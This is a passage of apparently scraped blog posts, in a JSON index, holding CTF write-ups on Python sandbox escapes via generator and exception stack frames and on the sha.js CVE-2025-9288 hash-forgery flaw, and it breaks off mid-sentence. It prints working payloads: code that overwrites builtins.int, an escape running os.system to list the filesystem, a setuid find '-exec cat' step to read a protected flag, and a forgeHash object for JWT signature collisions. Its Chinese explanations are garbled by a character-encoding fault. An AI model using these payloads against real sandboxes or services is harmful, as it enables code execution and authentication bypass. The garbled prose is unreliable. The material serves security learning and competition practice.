print(value)\n\nå¯ä»¥ä½¿ç”¨ç®€æ´çš„è¯­æ³•ç›´æ¥å®šä¹‰ï¼Œä¸éœ€è¦å®šä¹‰å‡½æ•°\na=(i+1 for i in range(100))for value in a:    print(value)\n\ngi_code\n\nè¯´æ˜ï¼šç”Ÿæˆå™¨å…³è”çš„ä»£ç å¯¹è±¡ (code object)ã€‚\n\ngi_frame\n\nè¯´æ˜ï¼šç”Ÿæˆå™¨çš„å¸§å¯¹è±¡ (frame object)ï¼Œè¡¨ç¤ºç”Ÿæˆå™¨å½“å‰çš„æ‰§è¡Œæ ˆå¸§ã€‚å®ƒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œç‚¹ç­‰ä¿¡æ¯ã€‚\n\ngi_running\n\nè¯´æ˜ï¼šä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”Ÿæˆå™¨å½“å‰æ˜¯å¦æ­£åœ¨æ‰§è¡Œã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢ç”Ÿæˆå™¨åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«é‡å…¥ï¼ˆre-enteredï¼‰ã€‚\n\ngi_yieldfrom (Python 3.3+)\n\nè¯´æ˜ï¼šå¦‚æœç”Ÿæˆå™¨å½“å‰æ­£åœ¨ä½¿ç”¨ yield from å§”æ‰˜ç»™å¦ä¸€ä¸ªå­ç”Ÿæˆå™¨æˆ–è¿­ä»£å™¨ï¼Œè¿™ä¸ªå±æ€§ä¼šæŒ‡å‘é‚£ä¸ªå­è¿­ä»£å™¨ã€‚å¦åˆ™ä¸º Noneã€‚\n\ngi_frame.f_locals\n\nè¯´æ˜: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚\n\næ ˆå¸§å±æ€§ï¼šf_back:\n\nè¯´æ˜: æŒ‡å‘è°ƒç”¨æ ˆä¸­å½“å‰å¸§çš„ä¸Šä¸€å¸§ï¼ˆå³è°ƒç”¨å½“å‰å‡½æ•°çš„é‚£ä¸ªå‡½æ•°çš„å¸§ï¼‰ã€‚å¦‚æœå½“å‰å¸§æ˜¯è°ƒç”¨æ ˆçš„æœ€åº•éƒ¨ï¼ˆé€šå¸¸æ˜¯æ¨¡å—çº§åˆ«æˆ–è„šæœ¬çš„èµ·å§‹ç‚¹ï¼‰ï¼Œåˆ™ f_back ä¸º Noneã€‚\nç”¨é€”: ç”¨äºå›æº¯è°ƒç”¨æ ˆï¼Œäº†è§£å‡½æ•°æ˜¯å¦‚ä½•è¢«è°ƒç”¨çš„ã€‚è°ƒè¯•å™¨å¸¸ç”¨æ­¤å±æ€§æ¥å±•ç¤ºè°ƒç”¨å †æ ˆã€‚\n\nf_code:\n\nè¯´æ˜: å½“å‰å¸§å…³è”çš„ä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ã€‚ä»£ç å¯¹è±¡åŒ…å«äº†å…³äºå‡½æ•°æœ¬èº«çš„é™æ€ä¿¡æ¯ï¼Œä¾‹å¦‚å‡½æ•°çš„å­—èŠ‚ç ã€å¸¸é‡ã€å˜é‡åç­‰ã€‚\n\nç”¨é€”: é€šè¿‡ f_code å¯ä»¥è®¿é—®åˆ°ï¼š\n\nf_code.co_name: å‡½æ•°çš„åç§°ã€‚\nf_code.co_filename: å‡½æ•°å®šä¹‰æ‰€åœ¨çš„æ–‡ä»¶åã€‚\nf_code.co_varnames: å‡½æ•°çš„å±€éƒ¨å˜é‡åå’Œå‚æ•°åï¼ˆå…ƒç»„ï¼‰ã€‚\nf_code.co_argcount: æ™®é€šå‚æ•°çš„ä¸ªæ•°ã€‚\nf_code.co_firstlineno: å‡½æ•°åœ¨æºæ–‡ä»¶ä¸­å¼€å§‹çš„è¡Œå·ã€‚\n\n\n\nf_locals:\n\nè¯´æ˜: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å½“å‰å¸§çš„å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬å‡½æ•°å‚æ•°ï¼‰ã€‚å­—å…¸çš„é”®æ˜¯å˜é‡åï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå€¼æ˜¯å˜é‡çš„å®é™…å€¼ã€‚\nç”¨é€”: æŸ¥çœ‹æˆ–ä¿®æ”¹ï¼ˆä¸æ¨èï¼Œä½†æŠ€æœ¯ä¸Šå¯èƒ½ï¼‰å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚è°ƒè¯•æ—¶éå¸¸æœ‰ç”¨ã€‚\n\nf_globals:\n\nè¯´æ˜: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å½“å‰å¸§æ‰§è¡Œæ—¶å¯è§çš„å…¨å±€å˜é‡ã€‚è¿™é€šå¸¸æ˜¯å‡½æ•°å®šä¹‰æ‰€åœ¨çš„æ¨¡å—çš„å‘½åç©ºé—´ã€‚\nç”¨é€”: æŸ¥çœ‹æˆ–ä¿®æ”¹ï¼ˆåŒæ ·ä¸æ¨èï¼‰å…¨å±€å˜é‡ã€‚\n\nf_builtins:\n\nè¯´æ˜: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å½“å‰å¸§å¯ä»¥è®¿é—®çš„å†…å»ºåç§°ï¼ˆbuilt-in namesï¼‰ï¼Œä¾‹å¦‚ len(), print() ç­‰ã€‚\nç”¨é€”: äº†è§£å½“å‰æ‰§è¡Œç¯å¢ƒä¸‹çš„å†…å»ºå‡½æ•°å’Œå¸¸é‡ã€‚\n\nf_lineno:\n\nè¯´æ˜: å½“å‰å¸§æ­£åœ¨æ‰§è¡Œæˆ–å³å°†æ‰§è¡Œçš„æºä»£ç è¡Œå·ã€‚\nç”¨é€”: ç²¾ç¡®å®šä½ä»£ç æ‰§è¡Œåˆ°çš„ä½ç½®ï¼Œå¯¹äºè°ƒè¯•å’Œé”™è¯¯æŠ¥å‘Šè‡³å…³é‡è¦ã€‚\n\nf_lasti:\n\nè¯´æ˜: å½“å‰å¸§ä¸­æœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ï¼ˆç›¸å¯¹äº f_code.co_codeï¼Œå³å­—èŠ‚ç å­—ç¬¦ä¸²ï¼‰ã€‚å¦‚æœæ˜¯ -1ï¼Œè¡¨ç¤ºè¿˜æ²¡æœ‰å­—èŠ‚ç æŒ‡ä»¤è¢«æ‰§è¡Œï¼ˆä¾‹å¦‚ï¼Œåœ¨å‡½æ•°åˆšå¼€å§‹æ—¶ï¼‰ã€‚\nç”¨é€”: æ›´åº•å±‚çš„è°ƒè¯•ï¼Œäº†è§£å­—èŠ‚ç çº§åˆ«çš„æ‰§è¡Œæƒ…å†µã€‚\n\nç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸åŸç†ï¼šç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡ f_backï¼ˆè¿”å›å‰ä¸€å¸§ï¼‰ä»è€Œé€ƒé€¸å‡ºå»è·å– globals å…¨å±€ç¬¦å·è¡¨\ns3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def waff():    def f():        yield g.gi_frame.f_back    g = f()  #ç”Ÿæˆå™¨    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡      #frame = [x for x in g][0] #ç”±äºç”Ÿæˆå™¨ä¹Ÿæ˜¯è¿­ä»£å™¨ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡     b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals    return bb=waff()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals)print(locals[&quot;b&quot;])\n\næˆ‘ä»¬ä»”ç»†çœ‹è¿™äº›ä»£ç \nlocals å®šä¹‰äº†ä¸€ä¸ªå­—å…¸ä½œä¸ºå±€éƒ¨ä½œç”¨åŸŸ\ncomplie(source, filename, mode) æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºå°† Python æºä»£ç ç¼–è¯‘æˆä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰\nsource æ˜¯è¦ç¼–è¯‘çš„æºä»£ç \nexec è¡¨ç¤ºåœ¨ locals ä¸­æ‰§è¡Œ codeï¼Œç»“æœä¼šè¿”å›åˆ° locals\næˆ‘ä»¬çœ‹åˆ° code ä¸­çš„å†…å®¹ï¼Œå®šä¹‰äº†ä¸€ä¸ª waffï¼Œå®šä¹‰ä¸€ä¸ª fï¼Œf æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°å…¶ä¸­ yeild äº†ä¸€ä¸ª g.gl_frame.f_back\ngl_frame æŒ‡çš„æ˜¯ f()çš„æ ˆå¸§ï¼Œ.f_back åæŒ‡ waff() çš„æ ˆå¸§ã€‚\nframe &#x3D; next(g)è·å–äº†ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ï¼Œä¹‹åæ‰§è¡Œ b = frame.f_back.f_back.f_globals[&#39;s3cret&#39;]ï¼Œä¸€æ¬¡ back ä¹‹åæŒ‡å‘æ‰§è¡Œå‡½æ•°çš„æ ˆå¸§ä¹Ÿå°±æ˜¯ exec çš„æ ˆå¸§(filename çš„ç¯å¢ƒ)ï¼Œå†ä¸€æ¬¡ back ä¹‹åæ¥åˆ°å…¨å±€çš„æ ˆå¸§ã€‚f_globals è·å–äº†å…¨å±€å˜é‡å­—å…¸ï¼Œä»ä¸­å–å‡º s3cretï¼Œä½œç”¨åŸŸæ˜¯ localsï¼Œæ‰€ä»¥ locals ä¸­ä¼šå¤šå‡º &quot;b&quot;:&quot;this is flag&quot;\n\nä¾‹é¢˜ï¼šimport sysimport oscodes=&#x27;&#x27;&#x27;&lt;&lt;codehere&gt;&gt;&#x27;&#x27;&#x27;try:    codes.encode(&quot;ascii&quot;)except UnicodeEncodeError:    exit(0)if &quot;__&quot; in codes:    print(&quot;__ bypass!!&quot;)    exit(0)codes+=&quot;\\nres=factorization(c)&quot;print(codes)locals=&#123;&quot;c&quot;:&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;,&quot;__builtins__&quot;: None&#125;res=set()def blackFunc(oldexit):    def func(event, args):        blackList =[&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;]        for i in blackList:            if i in (event + &quot;&quot;.join(str(s) for s in args)).lower():                print(&quot;noooooooooo&quot;)                print(i)                oldexit(0)    return funccode = compile(codes, &quot;&lt;judgecode&gt;&quot;, &quot;exec&quot;)sys.addaudithook(blackFunc(os._exit))exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals)print(locals)p=int(locals[&quot;res&quot;][0])q=int(locals[&quot;res&quot;][1])if(p&gt;1e5 and q&gt;1e5 and p*q==int(&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;)):    print(&quot;Correct!&quot;,end=&quot;&quot;)else:    print(&quot;Wrong!&quot;,end=&quot;&quot;)\n\nè¯»ä»£ç æˆ‘ä»¬çŸ¥é“è¦æˆ‘ä»¬å†™ä¸€ä¸ªå‡½æ•°åˆ†è§£ c è¿™ä¸ªè¶…å¤§çš„æ•°å­—ï¼Œä¸” pq è¦åŒæ—¶å¤§äº 10000ï¼ŒåŒæ—¶æœ‰æ—¶é—´é™åˆ¶ï¼Œå¾ˆæ˜¾ç„¶æ­£å¸¸çš„æ–¹æ³•å‡ ä¹ä¸å¯èƒ½ç¬¦åˆè¦æ±‚ï¼Œä½†è¿™é‡Œæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯ç”¨ int è½¬æ¢å­—ç¬¦ä¸²å¾—åˆ°çš„ï¼Œäºæ˜¯ç»“åˆæ ˆå¸§é€ƒé€¸ï¼Œæˆ‘ä»¬æƒ³åˆ°è¦†ç›–æ‰åŸæœ¬çš„ int æ–¹æ³•ï¼Œå°†ç»“æœå¯æ§\ndef factorization(c_param):    def fake_int(i_param):        return 100001 * 100002    a = (a.gi_frame.f_back.f_back for i in [1])    current_function_frame = [x for x in a][0]    host_globals = current_function_frame.f_back.f_back.f_globals    builtins_str_name = &quot;_&quot; + &quot;_&quot; + &quot;builtins&quot; + &quot;_&quot; + &quot;_&quot;    host_builtins = host_globals[builtins_str_name]    host_builtins.int = fake_int    return (100001, 100002)\n\nå¼‚å¸¸æ ˆå¸§é€ƒé€¸\nè¡¥å……è¯´æ˜ï¼Œä»€ä¹ˆæ˜¯å›æº¯å¯¹è±¡ï¼šå›æº¯å¯¹è±¡ä»£è¡¨ä¸€ä¸ª å¼‚å¸¸ çš„æ ˆè·Ÿè¸ªä¿¡æ¯ã€‚ å½“å¼‚å¸¸å‘ç”Ÿæ—¶ä¼šéšå¼åœ°åˆ›å»ºä¸€ä¸ªå›æº¯å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨ types.TracebackType æ˜¾å¼åœ°åˆ›å»ºã€‚_3.7 ç‰ˆæœ¬å_å›æº¯å¯¹è±¡å¯ä»¥é€šè¿‡ Python ä»£ç æ˜¾å¼åœ°å®ä¾‹åŒ–ã€‚å¯¹äºéšå¼åœ°åˆ›å»ºçš„å›æº¯å¯¹è±¡ï¼Œå½“æŸ¥æ‰¾å¼‚å¸¸å¤„ç†å™¨ä½¿å¾—æ‰§è¡Œæ ˆå±•å¼€æ—¶ï¼Œä¼šåœ¨æ¯ä¸ªå±•å¼€å±‚çº§çš„å½“å‰å›æº¯ä¹‹å‰æ’å…¥ä¸€ä¸ªå›æº¯å¯¹è±¡ã€‚ å½“è¿›å…¥ä¸€ä¸ªå¼‚å¸¸å¤„ç†å™¨æ—¶ï¼Œç¨‹åºå°†å¯ä»¥ä½¿ç”¨æ ˆè·Ÿè¸ªã€‚å®ƒå¯ä½œä¸º sys.exc_info() æ‰€è¿”å›çš„å…ƒç»„çš„ç¬¬ä¸‰é¡¹ ï¼Œä»¥åŠæ‰€æ•è·å¼‚å¸¸çš„ traceback å±æ€§è¢«è·å–ã€‚\n\ndef get_stack_frame_via_exception():    try:        raise Exception    except Exception as e:        tb = e.__traceback__  # è·å–å¼‚å¸¸çš„å›æº¯å¯¹è±¡        while tb.tb_next:  # éå†åˆ°å½“å‰å¸§            tb = tb.tb_next        return tb.tb_frame  # è¿”å›å½“å‰æ ˆå¸§å¯¹è±¡\n\nè¯´æ˜ï¼š\nä»£ç ç›´æ¥ç»™å‡ºå¼‚å¸¸ï¼Œtb = e.__traceback__ è·å–å¼‚å¸¸çš„å›æº¯å¯¹è±¡\n\ntraceback.tb_nextç‰¹æ®Šçš„å¯å†™å±æ€§ tb_next æ˜¯æ ˆè·Ÿè¸ªä¸­çš„ä¸‹ä¸€å±‚çº§ï¼ˆé€šå¾€å‘ç”Ÿå¼‚å¸¸çš„å¸§ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ä¸‹ä¸€å±‚çº§åˆ™ä¸º Noneã€‚_3.7 ç‰ˆæœ¬å_è¯¥å±æ€§ç°åœ¨æ˜¯å¯å†™çš„ã€‚\n\né€šè¿‡å¾ªç¯ tb.tb_nextï¼ŒçŸ¥é“ä¸‹ä¸€å±‚çº§æ˜¯ noneï¼Œæ­¤æ—¶è¿”å›çš„å°±æ˜¯æœ€ä¸‹é¢çš„æ ˆå¸§ï¼Œä¹Ÿå°±é€ƒé€¸å‡ºæ¥äº†\nä¾‹é¢˜:minil pyboxé¢˜ç›®ç›´æ¥ç»™äº†æºç \nfrom flask import Flask, request, Responseimport multiprocessingimport sysimport ioimport astapp = Flask(__name__)class SandboxVisitor(ast.NodeVisitor):    forbidden_attrs = &#123;        &quot;__class__&quot;, &quot;__dict__&quot;, &quot;__bases__&quot;, &quot;__mro__&quot;, &quot;__subclasses__&quot;,        &quot;__globals__&quot;, &quot;__code__&quot;, &quot;__closure__&quot;, &quot;__func__&quot;, &quot;__self__&quot;,        &quot;__module__&quot;, &quot;__import__&quot;, &quot;__builtins__&quot;, &quot;__base__&quot;    &#125;    def visit_Attribute(self, node):        if isinstance(node.attr, str) and node.attr in self.forbidden_attrs:            raise ValueError        self.generic_visit(node)    def visit_GeneratorExp(self, node):        raise ValueErrordef sandbox_executor(code, result_queue):    safe_builtins = &#123;        &quot;print&quot;: print,        &quot;filter&quot;: filter,        &quot;list&quot;: list,        &quot;len&quot;: len,        &quot;addaudithook&quot;: sys.addaudithook,        &quot;Exception&quot;: Exception    &#125;    safe_globals = &#123;&quot;__builtins__&quot;: safe_builtins&#125;    sys.stdout = io.StringIO()    sys.stderr = io.StringIO()    try:        exec(code, safe_globals)        output = sys.stdout.getvalue()        error = sys.stderr.getvalue()        result_queue.put((&quot;ok&quot;, output or error))    except Exception as e:        result_queue.put((&quot;err&quot;, str(e)))def safe_exec(code: str, timeout=1):    code = code.encode().decode(&#x27;unicode_escape&#x27;)    tree = ast.parse(code)    SandboxVisitor().visit(tree)    result_queue = multiprocessing.Queue()    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))    p.start()    p.join(timeout=timeout)    if p.is_alive():        p.terminate()        return &quot;Timeout: code took too long to run.&quot;    try:        status, output = result_queue.get_nowait()        return output if status == &quot;ok&quot; else f&quot;Error: &#123;output&#125;&quot;    except:        return &quot;Error: no output from sandbox.&quot;CODE = &quot;&quot;&quot;def my_audit_checker(event,args):    allowed_events = [&quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;]    if not list(filter(lambda x: event == x, allowed_events)):        raise Exception    if len(args) &gt; 0:        raise Exceptionaddaudithook(my_audit_checker)print(&quot;&#123;&#125;&quot;)&quot;&quot;&quot;badchars = &quot;\\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;@app.route(&#x27;/&#x27;)def index():    return open(__file__, &#x27;r&#x27;).read()@app.route(&#x27;/execute&#x27;,methods=[&#x27;POST&#x27;])def execute():    text = request.form[&#x27;text&#x27;]    for char in badchars:        if char in text:            return Response(&quot;Error&quot;, status=400)    output=safe_exec(CODE.format(text))    if len(output)&gt;5:        return Response(&quot;Error&quot;, status=400)    return Response(output, status=200)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\nè¿™è¾¹ä½¿ç”¨å¼‚å¸¸æ ˆå¸§é€ƒé€¸è·å–åˆ° __builtins__\ntext=&quot;)list=lambda x:Truelen=lambda x:Falsetry:    1/0except Exception as e:    frame = e.__traceback__.tb_frame.f_back    builtins = frame.f_globals[&#x27;__builtins__&#x27;]    builtins.exec(&quot;builtins.__import__(&#x27;os&#x27;).system(&#x27;ls / -al&gt;app.py&#x27;)&quot;)   print(&quot;\n\nç”±äºè¾“å‡ºè¢«é™åˆ¶ï¼Œç›´æ¥æ”¾åˆ° app.py æˆ–è€…è‡ªå·±å†™ä¸€ä¸ªé™æ€ç•Œé¢\n\nå¯ä»¥çœ‹è§å…¶ä¸­æœ‰ flag æ–‡ä»¶ï¼Œä½†æ˜¯ç›´æ¥è¯»ä¼šæœ‰æƒé™é—®é¢˜ï¼Œæ— æ³•å›æ˜¾ï¼ŒæŸ¥çœ‹ entrypoint.sh æˆ‘ä»¬å¯ä»¥çŸ¥é“ find è¢« chmod 4755ï¼Œé€šè¿‡ find å¯ä»¥å¯¹æ¯ä¸€ä¸ªæ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œä¸€ä¸ªå‘½ä»¤çš„æœºåˆ¶ï¼Œæˆ‘ä»¬æ„é€  find . -exec cat /m1* \\; åˆ° app.py å¯å¾—åˆ° flag\n","tags":["CTF"]},{"title":"sha.js-2.4.10-CVE-2025-9288","url":"/2025/11/03/sha.js-2.4.10-CVE-2025-9288/","content":"ç®€ä»‹åœ¨ sha.js&lt;&#x3D;2.4.11 ç‰ˆæœ¬ä¸‹ï¼Œç¼ºå°‘å¯¹ç±»å‹çš„ä¸¥æ ¼æ£€æŸ¥ï¼Œå½“ä¼ å…¥çš„æ•°æ®ä¸æ˜¯ bufferï¼Œstring ç±»å‹æ—¶ä¼šå¯¼è‡´æ— æ•ˆå€¼ã€æŒ‚èµ·å’Œå€’å¸¦å“ˆå¸ŒçŠ¶æ€ï¼ˆåŒ…æ‹¬å°†æ ‡è®°çš„å“ˆå¸Œè½¬æ¢ä¸ºæœªæ ‡è®°çš„å“ˆå¸Œï¼‰æˆ–å…¶ä»–é€šå¸¸æœªå®šä¹‰çš„è¡Œä¸º\nä¸»è¦å‡½æ•°Hash.prototype.update = function (data, enc) &#123;  if (typeof data === &#x27;string&#x27;) &#123;    enc = enc || &#x27;utf8&#x27;    data = Buffer.from(data, enc)  &#125;  var block = this._block  var blockSize = this._blockSize  var length = data.length  var accum = this._len  for (var offset = 0; offset &lt; length;) &#123;    var assigned = accum % blockSize    var remainder = Math.min(length - offset, blockSize - assigned)    for (var i = 0; i &lt; remainder; i++) &#123;      block[assigned + i] = data[offset + i]    &#125;    accum += remainder    offset += remainder    if ((accum % blockSize) === 0) &#123;      this._update(block)    &#125;  &#125;  this._len += length  return this&#125;\n\nè§‚å¯Ÿä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“ä¼ å…¥çš„ data ä¸æ˜¯ä¸€ä¸ª string æ—¶ï¼Œä¼šç›´æ¥ç»•è¿‡ if æ£€æŸ¥è€Œç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œæ­¤æ—¶ï¼Œå½“æˆ‘ä»¬çš„ä¼ å…¥çš„ data æ˜¯ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œdata.length æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä»£ç é€»è¾‘å°†ä»–èµ‹å€¼ç»™äº† length ä¹‹ååœ¨ this._len += length\nå¦‚ä½•åˆ©ç”¨ç…§ä¸Šé¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ‰é™æ¡ä»¶ä¸‹æ§åˆ¶ä¸åŒçš„å­—ç¬¦ä¸²ç”Ÿæˆçš„å“ˆå¸Œå€¼ç›¸åŒï¼Œä¾‹å¦‚ï¼š\n\nå½“è®¡ç®—å“ˆå¸Œæ—¶çš„é€»è¾‘æ˜¯è°ƒç”¨å¤šæ¬¡ update ä»¥åŠèƒ½ä¼ å…¥å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½å®ç°æ§åˆ¶ã€‚\nç±»ä¼¼çš„å‡½æ•°é€»è¾‘å¦‚ä¸‹\nconst forgeHash = (data, payload) =&gt; JSON.stringify([payload, &#123; length: -payload.length&#125;, [...data]])const sha = require(&#x27;sha.js&#x27;)const &#123; randomBytes &#125; = require(&#x27;crypto&#x27;)const sha256 = (...messages) =&gt; &#123;  const hash = sha(&#x27;sha256&#x27;)  messages.forEach((m) =&gt; hash.update(m))  return hash.digest(&#x27;hex&#x27;)&#125;\n\nå½±å“\næ±¡æŸ“å“ˆå¸Œå€¼ï¼Œé€šè¿‡æ§åˆ¶ length å¯¼è‡´ä¸¤ä¸ªä¸åŒå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ç›¸åŒ\né€šè¿‡ç±»å‹æˆªæ–­æ¥å®ç°ç¢°æ’\n\nä¾‹ï¼š{ length: buf.length, ...buf, 0: buf[0] + 256 } ç”±äºä¸€ä¸ªå­—èŠ‚åªèƒ½å­˜å‚¨ 0 åˆ° 255 ä¹‹é—´çš„å€¼ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå€¼åœ¨åŠ ä¸Š 256 åå¤§äº 255 å°±ä¼šå‘ç”Ÿæˆªæ–­ xxx%256 ä½¿åŸå§‹æ•°æ®å’Œæ¶æ„æ•°æ®ç”Ÿæˆå“ˆå¸Œå€¼ä¸€æ ·\n\nlength è¿‡å¤§æ—¶ä½¿æœåŠ¡èµ„æºè€—å°½ï¼Œæ‹’ç»æœåŠ¡\nåˆ©ç”¨ sha.js çš„å“ˆå¸Œç¢°æ’æ¼æ´ï¼Œæ¬ºéª—æœåŠ¡å™¨ä½¿ç”¨ç›¸åŒçš„éšæœºæ•°å»ç­¾ç½²ä¸¤ä¸ªä¸åŒçš„æ¶ˆæ¯ï¼Œä»è€Œè®©æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»£æ•°è¿ç®—åæ¨å‡ºæœåŠ¡å™¨çš„ç§é’¥ã€‚\n\né¢˜ç›®ç¯å¢ƒn1ctf-eezzjsconst crypto = require(&#x27;crypto&#x27;);const sha = require(&#x27;sha.js&#x27;);const sha256 = (...messages) =&gt; &#123;    const hash = sha(&#x27;sha256&#x27;);    messages.forEach((m) =&gt; hash.update(m));    return hash.digest(&#x27;hex&#x27;);&#125;;const JWT_SECRET = crypto.randomBytes(9).toString(&#x27;hex&#x27;);const toBase64Url = (input) =&gt; &#123;    const buffer = Buffer.isBuffer(input) ? input : Buffer.from(input);    return buffer        .toString(&#x27;base64&#x27;)        .replace(/\\+/g, &#x27;-&#x27;)        .replace(/\\//g, &#x27;_&#x27;)        .replace(/=+$/, &#x27;&#x27;);&#125;;const fromBase64Url = (input) =&gt; &#123;    const paddedLength = (4 - (input.length % 4)) % 4;    const base64 = input.replace(/-/g, &#x27;+&#x27;).replace(/_/g, &#x27;/&#x27;) + &#x27;=&#x27;.repeat(paddedLength);    return Buffer.from(base64, &#x27;base64&#x27;);&#125;;const hashPassword = (password, salt = &#x27;&#x27;) =&gt; sha256(password, salt);const signJWT = (payload, &#123; expiresIn &#125; = &#123;&#125;, secret = JWT_SECRET) =&gt; &#123;    const header = &#123; alg: &#x27;HS256&#x27;, typ: &#x27;JWT&#x27; &#125;;    const now = Math.floor(Date.now() / 1000);    console.log(payload)    const body = &#123; ...payload, length:payload.username.length,iat: now &#125;;    if (expiresIn) &#123;        body.exp = now + expiresIn;    &#125;    return [        toBase64Url(JSON.stringify(header)),        toBase64Url(JSON.stringify(body)),        sha256(...[JSON.stringify(header), body, secret])    ].join(&#x27;.&#x27;);&#125;;const verifyJWT = (token, secret = JWT_SECRET) =&gt; &#123;    if (typeof token !== &#x27;string&#x27;) &#123;        return null;    &#125;    const parts = token.split(&#x27;.&#x27;);    if (parts.length !== 3) &#123;        return null;    &#125;    const [encodedHeader, encodedPayload, signature] = parts;    let header;    let payload;    try &#123;        header = JSON.parse(fromBase64Url(encodedHeader).toString());        payload = JSON.parse(fromBase64Url(encodedPayload).toString());    &#125; catch (err) &#123;        return null;    &#125;    const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);    let providedSignature;    let expectedSignature;    try &#123;        providedSignature = Buffer.from(signature, &#x27;hex&#x27;);        expectedSignature = Buffer.from(expectedSignatureHex, &#x27;hex&#x27;);    &#125; catch (err) &#123;        return null;    &#125;    if (        providedSignature.length !== expectedSignature.length ||        !crypto.timingSafeEqual(providedSignature, expectedSignature)    ) &#123;        return null;    &#125;    if (header.alg !== &#x27;HS256&#x27;) &#123;        return null;    &#125;    if (payload.exp &amp;&amp; Math.floor(Date.now() / 1000) &gt;= payload.exp) &#123;        return null;    &#125;    return payload;&#125;;module.exports = &#123;    hashPassword,    signJWT,    verifyJWT,&#125;;\n\né¢˜ç›®çš„ auth é€»è¾‘ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—ä¸€ä¸ª jwt æ¥è¿›è¡Œåç»­æ”»å‡»ï¼Œè€ŒæœåŠ¡ä¸Šä¸èƒ½æ³¨å†Œç”¨æˆ·ï¼Œåªæœ‰ä¸€ä¸ªé¢„å…ˆåˆ›å»ºçš„ admin ç”¨æˆ·ï¼Œè§‚å¯Ÿå…¶éªŒè¯ jwt çš„å‡½æ•°ä»¥åŠç­¾å‘ jwt 